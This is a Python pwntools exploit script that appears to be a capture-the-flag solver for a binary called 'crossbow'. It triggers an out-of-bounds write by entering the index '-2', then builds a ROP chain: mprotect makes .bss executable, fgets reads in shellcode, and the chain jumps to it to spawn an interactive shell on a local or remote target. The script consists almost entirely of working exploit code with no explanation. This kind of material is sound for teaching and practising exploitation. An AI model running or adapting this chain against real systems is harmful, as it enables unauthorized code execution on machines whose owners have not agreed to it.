#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './crossbow' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e   = ELF(fname, checksec=False)
rop = ROP(e)

sa  = lambda x,y : r.sendafter(x,y)
sla = lambda x,y : r.sendlineafter(x,y)

print(f'[*] Gadgets:\n\t \
      pop rdi:    {rop.rdi[0]:#04x}\n\t \
      pop rsi:    {rop.rsi[0]:#04x}\n\t \
      pop rdx:    {rop.rdx[0]:#04x}\n\t \
      bss():      {e.bss():#04x}\n\t \
      fgets:      {e.sym.fgets:#04x}\n\t \
      mprotect:   {e.sym.mprotect:#04x}\n\t \
      STDIN:      {e.sym.__stdin_FILE:#04x}\n \
')

# mprotect
off = 0x200
pl  = b'w3th4nds'
pl += p64(rop.rdi[0])
pl += p64(e.bss())
pl += p64(rop.rsi[0])
pl += p64(0x1000)
pl += p64(rop.rdx[0])
pl += p64(0x7)
pl += p64(e.sym.mprotect)

# fgets
pl += p64(rop.rdi[0])
pl += p64(e.bss(off))
pl += p64(rop.rsi[0])
pl += p64(0x80)
pl += p64(rop.rdx[0])
pl += p64(e.sym.__stdin_FILE)
pl += p64(e.sym.fgets)

# run shellcode
pl += p64(e.bss(off + 1))

# OOB
sla('shoot: ', '-2')
sa('> ', pl)

r.sendline(asm(shellcraft.sh()))

print('~~ Shell ~~\n')
r.interactive()